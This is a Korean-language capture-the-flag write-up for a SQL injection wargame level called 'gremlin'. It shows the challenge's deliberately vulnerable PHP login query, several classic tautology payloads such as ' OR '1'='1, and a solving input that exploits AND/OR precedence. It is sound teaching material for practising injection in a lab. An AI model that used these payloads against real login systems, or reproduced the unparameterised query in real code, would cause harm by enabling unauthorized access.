# GREMLIN

## Problem
```php
<?php
  include "./config.php";
  login_chk();
  dbconnect();
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[id])) exit("No Hack ~_~"); // do not try to attack another table, database!
  if(preg_match('/prob|_|\.|\(\)/i', $_GET[pw])) exit("No Hack ~_~");
  $query = "select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'";
  echo "<hr>query : <strong>{$query}</strong><hr><br>";
  $result = @mysql_fetch_array(mysql_query($query));
  if($result['id']) solve("gremlin");
  highlight_file(__FILE__);
?>
```

## Background Knowledge
* [SQL Injection - Wikipedia](https://en.wikipedia.org/wiki/SQL_injection)
	- SQL 인젝션은 응용 프로그램 보안 상의 허점을 의도적으로 이용해, 악의적인 SQL문을 실행하여 데이터베이스를 비정상적으로 조작하는 코드 인젝션 공격 방법이다.
	- 구현
		+ 걸러지지 않은 탈출 문자
			- `' OR '1'='1`
			- `' OR '1'='1' {`
			- `' OR '1'='1' --`
			- `' OR '1'='1' /* `
		+ 정확하지 않은 타입 핸들링
		+ 블라인드 SQLi

## Inspection
* `preg_match`로 거르는 것은 다른 테이블을 건드는 것을 막기 위함이지, 문제에 관한 것은 아니다.
* `select id from prob_gremlin where id='{$_GET[id]}' and pw='{$_GET[pw]}'`
	- 파라미터로 `id`와 `pw`를 넘겨준다.
	- 이 파라미터들이 위 쿼리문에 들어간다.
* `if($result['id']) solve("gremlin");`
	- 위 쿼리문을 날렸을 때 `id` 열의 결과물이 있어야 통과한다.
* 파라미터에 `'`를 날려도 걸러지지 않는다.

## Solution
* 걸러지지 않는 탈출 문자(`'`)와 `AND`, `OR` 연산자 우선순위의 차이를 이용한다.
	- `?id=guest&pw=1234' or '1=1`
	- 쿼리가 `select id from prob_gremlin where id='guest' and pw='1234' or '1=1'` 와 같이 정상적으로 처리된다.